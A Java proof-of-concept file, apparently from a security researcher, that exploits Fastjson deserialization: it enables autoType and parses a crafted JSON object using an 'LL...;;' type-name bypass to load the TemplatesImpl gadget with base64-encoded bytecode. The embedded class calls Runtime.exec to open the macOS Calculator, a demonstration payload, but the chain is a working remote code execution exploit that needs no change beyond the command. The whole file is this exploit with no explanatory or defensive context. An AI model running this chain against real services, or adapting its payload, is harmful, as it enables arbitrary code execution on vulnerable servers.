import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @author <a href="http://blog.chenforcode.cn">PKUCoder</a>
 * @date 2022/3/19 5:27 下午
 * @description
 */
public class Poc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(
                "{\"@type\":\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\"," +
                        "\"_bytecodes\":[\"yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAkb3BlbiAtYSAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwCAAeAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAIAAhCgAZACIAIQACABUAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAFrEAAAACAAcAAAAGAAEAAAAMAAgAAAAMAAEAAAAFAAkADAAAAAgAFwAFAAEABgAAABYAAgAAAAAACrgAHRIftgAjV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=\"]," +
                        "\"_name\":\"c\"," +
                        "\"_tfactory\":{}," +
                        "\"outputProperties\":{}}", Feature.SupportNonPublicField);
    }
}
